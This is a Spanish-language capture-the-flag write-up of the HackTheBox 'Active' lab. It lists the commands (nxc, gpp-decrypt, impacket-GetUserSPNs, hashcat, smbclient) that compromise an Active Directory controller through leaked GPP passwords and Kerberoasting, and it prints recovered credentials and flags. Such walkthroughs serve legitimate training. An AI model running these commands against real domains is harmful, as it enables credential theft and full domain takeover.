Con puertos como el 88 (Kerberos), 389 (LDAP) y 445 (SMB) abiertos, es evidente que la máquina es un controlador de dominio de Active Directory. Un escaneo de scripts revela el dominio active.htb, que se añade al /etc/hosts.
// 02

NULL SESSION — Credenciales GPP en SYSVOL

Se comprueba el listado de shares SMB mediante null session.

enumeración de shares
nxc smb 10.129.50.146 -u '' -p '' nxc smb 10.129.50.146 -u '' -p '' --shares
Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share IPC$ READ Remote IPC NETLOGON Logon server share Replication READ SYSVOL Logon server share
Share Replication accesible anónimamente
El share Replication es de lectura pública y contiene una copia de SYSVOL. Dentro de \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\ se encuentra el fichero Groups.xml, típico de Group Policy Preferences.
groups.xml
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfC uNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
¿Qué es una GPP Password?
Las Group Policy Preferences permitían fijar contraseñas de cuentas locales/de servicio cifradas con AES en el atributo cpassword del XML, pero Microsoft publicó la clave AES estática usada para cifrarlas (MS14-025), por lo que cualquier usuario con acceso al SYSVOL puede descifrarlas.

Se descifra el cpassword con gpp-decrypt.

descifrado de la contraseña gpp
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
Credenciales obtenidas
Las credenciales del usuario de servicio son SVC_TGS:GPPstillStandingStrong2k18.

Con estas credenciales se accede al share Users y se recupera la flag del escritorio de SVC_TGS.

acceso al share users
smbclient //10.129.50.146/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18'
USER FLAG 4a2aaacd57bc6c38e7c09f08db35d45d
// 03

KERBEROASTING — Ticket TGS del Administrator

Con las credenciales de SVC_TGS se lanza un ldapdomaindump para enumerar más información del dominio.

dump del dominio via ldap
ldapdomaindump active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18'
SPN en la cuenta Administrator
El usuario Administrator tiene un SPN (Service Principal Name) asociado, lo que lo hace vulnerable a un ataque de Kerberoasting: se puede solicitar su ticket TGS y crackearlo offline sin generar alertas de bloqueo de cuenta.

Se solicita el ticket con impacket-GetUserSPNs usando las credenciales de SVC_TGS.

solicitud del ticket kerberoast
impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.50.146 -request-user Administrator -outputfile admin_hash.txt

Se crackea el hash $krb5tgs$23$... obtenido con hashcat contra rockyou.txt.

crackeo del ticket tgs
hashcat -m 13100 admin_hash.txt /usr/share/wordlists/rockyou.txt
Contraseña del Administrador crackeada
La contraseña del usuario Administrator es Ticketmaster1968.
// 04

ACCESO FINAL — Flag de Administrator

Con las credenciales Administrator:Ticketmaster1968 se repite el acceso al share Users, esta vez al escritorio del Administrador.

acceso como administrator
smbclient //10.129.50.146/Users -U 'active.htb/Administrator%Ticketmaster1968'

La conexión es exitosa y se recupera la flag del escritorio de Administrator.

ADMIN FLAG 7fbfead7ff667e39046c04da9dea2f38
